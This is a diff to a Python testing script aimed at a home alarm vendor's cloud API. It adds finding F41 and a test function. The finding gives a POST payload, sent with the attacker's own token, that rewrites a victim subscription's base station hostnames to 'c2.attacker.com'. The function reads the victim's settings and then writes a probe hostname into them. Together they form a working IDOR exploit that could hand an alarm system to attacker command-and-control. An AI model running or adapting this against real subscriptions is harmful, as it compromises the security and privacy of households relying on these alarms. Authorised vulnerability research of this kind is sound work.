@@ -450,6 +450,34 @@ FINDINGS = [
                   'Test: PATCH /monitoring/v1/locations/{victim_locationId}/monitoring '
                   '{"serviceStatus":{"practiceMode":{"isEnabled":true}}} with own token; '
                   '200 = CRITICAL. Verify by GET same path -> practiceMode.isEnabled=true on victim location.'),
+    Finding("F41", "CRITICAL", "Base Station C2 Redirect via Cloud Admin Settings — obiwanA/obiwanB Hostname Override",
+            "yoda", "/ss3/subscriptions/{sid}/settings", "GET+POST", None,
+            verified=False,
+            notes='APK: yodaservice/common/SS3AdminSettings.java (classes14.dex) — cloud REST layer. '
+                  'SS3AdminSettings fields: monitoring, autoRearm, jamDetectionEnable, jamThreshold, '
+                  'pinResettable, sensorCheckin, swingerShutdown, UL985, obiwanA (String), obiwanB (String). '
+                  'Encapsulated in SS3SystemSettings{admin: SS3AdminSettings} returned by '
+                  'GET /ss3/subscriptions/{sid}/settings?settingsType=SYSTEM. '
+                  'obiwanA/obiwanB are the base station backend connection hostnames: '
+                  'PRODUCTION: bb1.simplisafe.com / bb2.simplisafe.com '
+                  'QA: bb1.qa.simplisafe.com / bb2.qa.simplisafe.com '
+                  'STAGE: bb1.stg.simplisafe.com / bb2.stg.simplisafe.com '
+                  '(ObiwanEnvironment.java, classes12.dex/com.simplisafe.mobile.data.models.local). '
+                  'BLE context: ProtobufFactory.setObiwanEnvironment() sends '
+                  'Ble.BluetoothMessageToBasestation{SET_SETTINGS, admin{obiwanA, obiwanB}} to base station. '
+                  'Cloud attack: POST /ss3/subscriptions/{victim_sid}/settings '
+                  'body: {"settings": {"admin": {"obiwanA": "c2.attacker.com", "obiwanB": "c2.attacker.com"}}} '
+                  'with own token (IDOR via sid). '
+                  'If server accepts field write and propagates to base station: '
+                  'base station reconnects to attacker C2 on next connection cycle (power cycle, '
+                  'network reset, or settings refresh). '
+                  'Attacker server receives all sensor events, alarm triggers, status updates. '
+                  'Attacker can issue commands to base station as if it were SimpliSafe backend. '
+                  'Impact: full infrastructure-level compromise of victim security system. '
+                  'Read test: GET /ss3/subscriptions/{victim_sid}/settings?settingsType=SYSTEM with own token; '
+                  '200+{admin:{obiwanA:"bb1.simplisafe.com"}} = field exposed, IDOR confirmed on read. '
+                  'Write test: POST same endpoint with {admin:{obiwanA:"probe.attacker-controlled.test"}}; '
+                  '200/204 = write accepted = CRITICAL C2 redirect capability.'),
 ]
 
 
@@ -1339,6 +1367,35 @@ def test_monitoring_suspension_idor(token, victim_location_id):
             _print("CRIT", 200, f"CONFIRMED state: {r3.text[:200]}")
     else:
         _print("INFO", r2.status_code, f"monitoring patch: {r2.text[:100]}")
+
+
+def test_c2_redirect_idor(token, victim_sid, probe_host="probe.ablation-test.invalid"):
+    """F41: Read obiwanA/B from cloud admin settings + attempt C2 hostname redirect on victim SID."""
+    print(f"\n=== F41 — Base Station C2 Redirect IDOR (sid={victim_sid}) ===")
+    r = get(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/settings?settingsType=SYSTEM",
+            token=token)
+    if r and r.status_code == 200:
+        try:
+            data = r.json()
+            admin = data.get("settings", {}).get("admin", data.get("admin", {}))
+            obia = admin.get("obiwanA")
+            obib = admin.get("obiwanB")
+            _print("CRIT", 200, f"C2 HOSTS EXPOSED sid={victim_sid}: obiwanA={obia} obiwanB={obib}")
+        except Exception as e:
+            _print("CRIT", 200, f"200 (parse err: {e}) raw={r.text[:200]}")
+    else:
+        _print("INFO", r.status_code if r else 0,
+               f"settings read: {r.text[:80] if r else 'no response'}")
+    body = {"settings": {"admin": {"obiwanA": probe_host, "obiwanB": probe_host}}}
+    r2 = post(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/settings",
+              token=token, json=body)
+    if not r2:
+        print("  POST failed"); return
+    if r2.status_code in (200, 201, 204):
+        _print("CRIT", r2.status_code,
+               f"C2 REDIRECT ACCEPTED sid={victim_sid} -> {probe_host}")
+    else:
+        _print("INFO", r2.status_code, f"settings write: {r2.text[:100]}")
 
 
 def test_webrtc_idor(token, victim_camera_uuid, victim_sid):
